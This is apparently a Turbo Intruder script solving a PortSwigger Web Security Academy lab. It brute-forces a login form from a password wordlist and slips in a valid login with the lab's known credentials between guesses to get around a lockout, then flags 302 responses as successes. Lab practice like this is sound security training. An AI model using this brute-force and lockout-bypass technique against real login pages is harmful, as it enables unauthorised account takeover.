def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, # this is just a protocol:domain:port string like https://example.com:443
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxQueueSize=3,
                           timeout=5,
                           maxRetriesPerRequest=3,
                           autoStart=False
                           )

    # We have to call engine.start() manually because we disabled autoStart
    engine.start(timeout=5)

    # You can queue arbitrary requests - you don't have to use the insertion point
    oddRequest = """POST /login HTTP/1.1
Host: 0a9800fc0374620ac05c36b500e8004c.web-security-academy.net
Content-Length: 30

username=wiener&password=peter"""
    

    
    for word in open('/home/kali/Documents/Portswigger_labs/Broken Authentication /passwords.txt'):
        engine.queue(target.req, word.rstrip())
        engine.queue(oddRequest)
        time.sleep(5)
  

def handleResponse(req, interesting):
    if '302' in req.response:
        table.add(req)
   